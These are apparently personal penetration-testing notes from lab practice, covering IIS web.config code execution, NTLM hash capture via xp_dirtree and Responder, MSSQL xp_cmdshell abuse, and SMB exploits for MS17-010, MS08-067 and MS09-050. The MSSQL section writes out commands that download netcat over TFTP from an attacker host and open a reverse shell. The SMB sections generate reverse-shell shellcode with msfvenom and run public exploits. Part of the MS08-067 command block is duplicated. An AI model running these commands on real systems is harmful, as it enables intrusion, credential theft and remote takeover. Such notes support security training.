# Exploits found while exploiting / reading

## Getting RCE using .config file for ASP application
On old version of IIS (e.g: IIS 5.1), it is possible to get code execution by inluding ASP code inside de .config file.  
- [https://soroush.secproject.com/blog/2014/07/upload-a-web-config-file-for-fun-profit/](https://soroush.secproject.com/blog/2014/07/upload-a-web-config-file-for-fun-profit/)  
  
  
## STEAL NTML Hash (Responder)
Important links:  
- [https://medium.com/@markmotig/how-to-capture-mssql-credentials-with-xp-dirtree-smbserver-py-5c29d852f478](https://medium.com/@markmotig/how-to-capture-mssql-credentials-with-xp-dirtree-smbserver-py-5c29d852f478)  
  
#### Steal hash from a windows service (example with ms-sql)  
On the victim machine:  
```bash
xp\_dirtree “\\\\<attacker\_ip>\\file.txt”  
# On the attacker machine  
responder -i <interface>  
```  
  
#### Use "responder" on the SMB service  
```bash
responder -I <interface>  
# Context, you have an LFI, and want to get the service account hash of the service 
index.php?file=\\\\10.10.10.1\\htb\\test.txt  
``` 
  
  

## MSSQL
Links:  
- [https://medium.com/ethical-hacking-blog/mssql-connectivity-with-sqsh-debec7188104](https://medium.com/ethical-hacking-blog/mssql-connectivity-with-sqsh-debec7188104)  
- [https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/MSSQL%20Injection.md](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/MSSQL%20Injection.md)  
- [http://pentestmonkey.net/cheat-sheet/sql-injection/mssql-sql-injection-cheat-sheet](http://pentestmonkey.net/cheat-sheet/sql-injection/mssql-sql-injection-cheat-sheet)  
- [https://gracefulsecurity.com/sql-injection-out-of-band-exploitation/](https://gracefulsecurity.com/sql-injection-out-of-band-exploitation/)  
- [https://book.hacktricks.xyz/pentesting/pentesting-mssql-microsoft-sql-server](https://book.hacktricks.xyz/pentesting/pentesting-mssql-microsoft-sql-server)  
-  [https://medium.com/@markmotig/how-to-capture-mssql-credentials-with-xp-dirtree-smbserver-py-5c29d852f478](https://medium.com/@markmotig/how-to-capture-mssql-credentials-with-xp-dirtree-smbserver-py-5c29d852f478)  

### Default credential
• sa:password  
  

### Connection
```bash
# Connections:
# Connecting to ms-sql (impacket library used):
mssqlclient.py <user>@10.10.10.10 -windows-auth
sqsh -S 10.10.10.10 -U <username> -P <password>
 
# Create a connection with the MSSQL Server instance:
# We need to add the following elements to the "/etc/freetds/freetds.conf" file:
[sqlserver-10.10.10.10]
    host = 10.10.10.10
    port = 3333
    tds = 8.0

# We also have to modify the "~/.sqshrc" file:
\set username=sa
\set password=password
\set style=vert

# We can now connect to the remote SQL server using the following command:
sqsh -S sqlserver-10.11.1.227  

# Basics MSSQL commands:
SELECT name FROM master..sysdatabases
go

use bankdb
go

SELECT Distinct TABLE_NAME FROM informations_schema.TABLES
go


# Execute Shell commands using MSSQL:
# Activate code execution:
EXEC SP_CONFIGURE ‘xp_cmdshell’,1
reconfigure
go

# We can also execute system commands on the remote machine using the "master.dbo.xp_cmdshell".
EXEC master.dbo.xp_cmdshell 'whoami'
go

# For example, we can download Netcat through TFTP:
EXEC master.dbo.xp_cmdshell 'cd c:\ && tftp -i 10.11.0.47 get nc.exe'
go

# We can now execute netcat to get a reverse shell:
EXEC master.dbo.xp_cmdshell 'cd c:\ && nc.exe -nv 10.11.0.47 443 -e cmd.exe'
go

# Using SQLCMD (localhost) -> TO CHECK (Monteverde):
# Show databases
sqlcmd -Q “select name, create_date from sys.databases”

# Good way to get a password
# To use with responder
Sqlcmd -Q “xp_dirtree ‘\\<IP>\\test’”
```
  
# Exploiting SMB service
- [https://www.hackingarticles.in/smb-penetration-testing-port-445/](https://www.hackingarticles.in/smb-penetration-testing-port-445/)  
  
## MS17-010 (SMB)
The remote machine is running the SMB service on port 139 and 445. This service vulnerable to MS17-010.  
We can check that by using the following nmap NSE script:  
```bash
nmap -p139,445 --script=smb-vuln-ms17-010 10.11.1.227  
```
  
We can get a public exploit code from this link:  
- [https://www.exploit-db.com/exploits/42315](https://www.exploit-db.com/exploits/42315)  
  
First, we need to download the following file:  
- [https://github.com/offensive-security/exploitdb-bin-sploits/raw/master/bin-sploits/42315.py](https://github.com/offensive-security/exploitdb-bin-sploits/raw/master/bin-sploits/42315.py)  
  
Then we will call it “mysmb.py” and store it in the same folder as the exploit  
 Before executing the exploit, we need to do some modifications:  
 First we will add more named\_pipe to the list called "find\_named\_pipe".  
This will improve our chances to exploit this vulnerability.  
A list of those named\_pipe can be found in Kali Linux:  
- /usr/share/metasploit-framework/data/wordlists/named\_pipes.txt  
  
![[Ms17-010_1.png]]
  
We also need to change the code in order to download a reverse shell and execute it through the SMB connection:  
  
![[Ms17-10_1.png]]
  

## MS08-67 (SMB):
As said before, the remote machine is running the SMB service on port 139 and 445.  
This service is also vulnerable to the MS08-067.  
  
We can check that by using the nmap NSE scripts:
```bash
nmap -p139,445 --script=smb-vuln-ms08-067.nse 10.11.1.227  
```

A public exploit code can be found at the following link:  
- https://github.com/jivoi/pentest/blob/master/exploit_win/ms08-067.py  
  
  
Before exploiting the vulnerability a modification needs to be done:  
 We will modify the original shellcode by a new one:
 ```bash
msfvenom -p windows/shell_reverse_tcp LHOST=10.11.0.47 LPORT=443 EXITFUNC=thread -b "\x00\x0a\x0d\x5c\x5f\x2f\x2e\x40" -f c -a x86 --platform windows
	# -p: payload
	# LHOST/LPORT/EXITFUNC: parameters
	# -b: bad chars
	# -f: format
	# -a: architecture
	# --platform: The platform for payload

# We can now execute the exploit:
python ms08-067.py 10.11.1.227 2 139
	# 10.11.1.227: ip address
	# 2: OS type, in this case Windows 2000 universal
	# 139: port to use, can be also used on port 445
	# -f: format
	# -a: architecture
	# --platform: The platform for payload

# We can now execute the exploit:
python ms08-067.py 10.11.1.227 2 139
	# 10.11.1.227: ip address
	# 2: OS type, in this case Windows 2000 universal
	# 139: port to use, can be also used on port 445
```   
  

## MS09-050 (SMB):
### Using Metasploit:
The remote machine is a Windows Server (R) 2008 Standard 6.0 and is runing the SMB protocol on port 445.  
This Windows Server version is vulnerable to the MS09-050 Vulnerability and a public exploit is available.  
more details can be found at the following URL:  
- https://www.rapid7.com/db/modules/exploit/windows/smb/ms09_050_smb2_negotiate_func_index 
  
Metasploit has a built-in exploit for this particular vulnerability, the source code can be found at the following URL:  
- [https://www.exploit-db.com/exploits/16363](https://www.exploit-db.com/exploits/16363)  
  
We can configure metasploit to exploit the remote vulnerability:
```bash
use exploit/windows/smb/ms09_050_smb2_negotiate_func_index
    # set RHOST 10.11.1.145
    # exploit
```

### No Metasploit
We can also exploit this vulnerability without using Metasploit. For example we can find a public code exploiting this vulnerability:  
- [https://github.com/SecWiki/winédows-kernel-exploits/blob/master/MS09-050/40280.py](https://github.com/SecWiki/windows-kernel-exploits/blob/master/MS09-050/40280.py)  
  
But before executing this code, we need to do a minor modification.  
We need to change the shellcode by one generated with msfvenom (METERPRETER): 
```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.11.0.47 LPORT=443 EXITFUNC=thread -f python -v shell -n 38  
	# -p: payload  
	# LHOST/LPORT/EXITFUNC: payload options  
	# -f: format  
	# -v: variable name  
	# -n: Prepend a nopsled of [length] size on to the payload  
```

In this case, it is mandatory to use the -n parameter, if you are not using it the exploit will no work.  
If we want to trigger the reverse shell code, we need a payload of 362 bytes.  
  
We can now execute the payload, the error is necessary, if we want to trigger the malicious payload, we need to try an authentification, no matter if it failed or not.  
  
  

